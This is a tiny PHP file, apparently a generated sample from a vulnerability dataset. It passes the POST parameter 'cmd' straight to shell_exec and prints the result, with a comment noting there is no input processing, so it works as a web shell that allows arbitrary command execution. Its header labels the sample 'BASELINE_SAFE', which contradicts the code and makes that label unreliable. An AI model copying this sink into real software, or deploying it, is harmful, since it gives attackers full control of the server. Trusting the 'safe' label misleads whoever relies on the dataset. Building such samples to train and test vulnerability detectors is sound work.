<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_DIRECT; SKELETON=S0; KEY=cmd; SINK=B3; VAR=v0064 */
function SINK_B3($command){
    $output=shell_exec($command);
    echo $output;
}
$inp = (string)($_POST["cmd"] ?? "");
$inp = (string)$inp; // no value processing
$out = SINK_B3($inp);
echo (string)($out);
?>
